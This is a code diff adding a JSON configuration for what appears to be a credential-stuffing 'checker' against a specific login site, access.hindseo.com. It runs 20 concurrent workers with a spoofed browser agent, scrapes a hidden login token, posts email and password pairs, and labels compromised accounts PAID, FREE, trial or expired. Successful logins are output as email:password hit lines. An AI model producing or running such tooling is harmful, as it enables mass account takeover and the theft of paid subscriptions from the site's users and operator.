@@ -1,0 +1,64 @@
+{
+  "id": "hindseo",
+  "name": "HindSEO",
+  "description": "aMember premium-tools-shop login at access.hindseo.com — login_attempt_id required",
+  "source_capture": "task_20260614_022852",
+  "settings": {
+    "workers": 20,
+    "timeout_seconds": 45,
+    "retry_on_error": 5,
+    "delay_ms": 150
+  },
+  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
+  "variables": {
+    "base_url": "https://access.hindseo.com",
+    "login_url": "https://access.hindseo.com/login",
+    "login_referer": "https://access.hindseo.com/login",
+    "member_url": "https://access.hindseo.com/member",
+    "subscriptions_url": "https://access.hindseo.com/member/subscriptions",
+    "payment_history_url": "https://access.hindseo.com/member/payment-history"
+  },
+  "steps": [
+    {
+      "id": "login_page",
+      "name": "GET /login — scrape login_attempt_id hidden field",
+      "method": "GET",
+      "url": "{{login_url}}"
+    },
+    {
+      "id": "login_post",
+      "name": "POST form login (amember_login, amember_pass, login_attempt_id, _referer)",
+      "method": "POST",
+      "url": "{{login_url}}",
+      "body": "application/x-www-form-urlencoded"
+    },
+    {
+      "id": "member",
+      "name": "GET /member — subscription + premium tools dashboard",
+      "method": "GET",
+      "url": "{{member_url}}",
+      "optional": true
+    }
+  ],
+  "plan_labels": {
+    "PAID": { "label": "PAID" },
+    "FREE": { "label": "FREE" },
+    "FREE_TRIAL": { "label": "FREE_TRIAL" },
+    "UNKNOWN": { "label": "UNKNOWN" },
+    "EXPIRED": { "label": "EXPIRED" }
+  },
+  "output": {
+    "hit_line": "{{email}}:{{password}} | Plan={{plan_name}} | Label={{plan_label}}",
+    "console_hit": "[HIT] {{email}} | Plan: {{plan_name}} ({{plan_label}})",
+    "console_fail": "[FAIL] {{email}} | {{reason}}"
+  },
+  "notes": [
+    "login_attempt_id is a fresh Unix timestamp from hidden input — scrape on each GET /login.",
+    "POST fields: amember_login, amember_pass, login_attempt_id, _referer.",
+    "Success: redirect to /member (premium-tools-shop dashboard).",
+    "Failure: div.am-errors — 'The user name or password is incorrect'.",
+    "FREE: #no_subscription or no accessible /member/go/* tool links.",
+    "PAID: subscription-item or accessible tool links on /member.",
+    "Theme: premium-tools-shop-theme (aMember Pro)."
+  ]
+}
